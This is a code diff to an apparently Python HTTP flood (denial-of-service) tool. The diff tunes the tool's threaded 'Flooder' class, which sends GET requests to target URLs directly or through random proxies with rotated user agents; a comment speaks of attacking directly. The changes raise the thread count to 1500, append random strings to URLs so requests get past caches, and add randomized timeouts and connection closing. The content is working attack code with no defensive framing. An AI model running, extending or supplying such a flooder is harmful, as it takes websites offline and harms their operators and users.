@@ -11,9 +11,10 @@ import string
 # TODO вынести это в config.txt
 referrer = ""
 request_methods = ["GET"]
-thread_limit = 600
-append_rand_string_to_url = False
-
+thread_limit = 1500
+append_rand_string_to_url = True
+min_timeout = 0
+max_timeout = 30
 # Global variables
 user_agents = []  # in file 'useragents.txt'
 proxies = []  # in file 'proxies.txt' if none - attack directly
@@ -34,7 +35,7 @@ class Flooder(threading.Thread):
                     "Referrer": referrer
                 }
                 if len(proxies) == 0:  # setting direct connection here
-                    connection = http.client.HTTPConnection(cur_url.netloc)
+                    connection = http.client.HTTPConnection(cur_url.netloc, timeout=random.randint(min_timeout, max_timeout))
                     url_str = cur_url.path + cur_url.params + cur_url.query
                 else:  # connect via random proxy
                     connection = http.client.HTTPConnection(random.choice(proxies))
@@ -44,6 +45,7 @@ class Flooder(threading.Thread):
                 else:
                     randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
                     connection.request(method=random.choice(request_methods), url=url_str + randstr, headers=cur_header)
+                connection.close()
         except:
             sys.exit()
             pass
@@ -52,9 +54,9 @@ class Flooder(threading.Thread):
 class SettingsReader():
     def __init__(self):
         self.read_useragents()
-        self.read_urls()
         self.read_proxies()
         self.read_config()
+        self.read_urls()
 
     @staticmethod
     def read_file_to_array(file_desc):
